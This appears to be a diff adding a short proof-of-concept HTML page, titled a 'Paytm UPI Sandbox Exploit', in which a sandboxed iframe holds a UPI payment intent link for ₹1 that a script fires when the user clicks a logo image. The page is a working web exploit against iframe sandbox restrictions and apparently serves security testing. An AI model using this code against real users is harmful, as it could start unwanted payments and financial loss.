@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Paytm UPI Sandbox Exploit</title>
+</head>
+<body>
+  <h3>Click the image to send ₹1 to Paytm UPI</h3>
+
+  <iframe id="sandboxed-frame" sandbox srcdoc='
+    <html>
+    <body>
+      <a id="upi" href="intent://pay?pa=receiver@paytm&pn=Test+User&am=1&cu=INR#Intent;scheme=upi;package=net.one97.paytm;end">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Paytm_logo.png/320px-Paytm_logo.png" width="200">
+      </a>
+      <script>
+        document.querySelector("img").onclick = () => {
+          document.getElementById("upi").click();
+        };
+      </script>
+    </body>
+    </html>
+  ' width="320" height="300"></iframe>
+
+</body>
+</html>
